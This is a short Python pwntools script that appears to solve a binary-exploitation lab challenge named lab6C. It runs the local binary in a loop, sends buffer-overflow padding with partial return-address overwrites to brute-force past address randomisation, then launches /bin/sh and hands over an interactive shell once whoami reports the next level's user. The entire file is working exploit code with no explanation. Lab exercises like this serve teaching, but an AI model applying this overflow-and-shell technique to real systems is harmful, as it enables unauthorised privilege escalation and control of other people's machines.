import struct
from pwn import *
while True:
    p  = process("./lab6C")
    p.recv(200)
    p.sendline("A"*40+"\xc6")
    p.recv(200)
    p.sendline("A"*196+"\x2b\x07")
    p.sendline("/bin/sh")
    p.sendline("whoami")
    ret = p.recv(200)
    if ("lab6B" in ret):
        p.interactive()
        quit()
    else:
        continue
